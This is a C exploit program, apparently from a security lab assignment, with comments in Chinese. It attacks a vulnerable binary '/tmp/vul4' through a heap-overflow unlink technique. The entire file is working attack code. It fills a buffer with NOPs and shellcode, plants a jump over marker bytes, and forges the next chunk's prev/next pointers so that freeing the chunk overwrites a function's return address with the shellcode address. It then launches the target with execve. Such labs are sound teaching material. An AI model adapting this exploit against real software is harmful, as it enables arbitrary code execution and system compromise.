#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode/shellcode.h"

#define TARGET "/tmp/vul4"

int main(void)
{
    //因为需要给p指针赋值，p指针的大小是1024 Byte
    char payload[1024] = { 0 };
    memset(payload, 0x90, sizeof(payload));
    //堆内存起始地址
    unsigned int start_addr=0x804a060;
    //因为需要按照CHUNK大小对齐，所以q堆空间大小为504 Byte
    unsigned int q_offset = 504;
    // shellcode相对于p堆空间起始位置偏移量
    unsigned int offset = 8;
    //重新申请后的p堆数据起始地址0x804a068（前面有8 Byte堆首）
    unsigned int payload_addr = start_addr+8;
    //shellcode地址0x804a070
    unsigned int shellcode_addr = payload_addr + offset;
    //q堆首pre指针地址0x804a260
    unsigned int q_l_addr=payload+q_offset;
    //q堆首next指针地址0x804a264
    unsigned int q_r_addr=payload + q_offset + 4;
    //栈空间中ebp的值
    unsigned int ebp = 0xffffda5c;
    //foo函数返回地址所在位置0xffffda60
    unsigned int return_addr = ebp + 4;

    //shellcode代码
    memcpy(payload + offset, shellcode, strlen(shellcode));
    //将 payload + 4 设置为 0xffffffff
    memset(payload + 4, 0xff, 4);
    //q堆首的pre指向payload起始地址
    memcpy(q_l_addr, &payload_addr, 4);
    //相对跳转指令，跳过4字节的0xff
    unsigned short int jmp_4_bytes = 0x6eb;
    memcpy(payload, &jmp_4_bytes, 2);
    //q堆首的next指向想要修改的内存地址foo函数的返回地址
    memcpy(q_r_addr, &return_addr, 4);
    char *args[] = {TARGET, payload, NULL};
    char *env[] = {NULL};

    execve(TARGET, args, env);
    fprintf(stderr, "execve failed.\n");

    return 0;
}
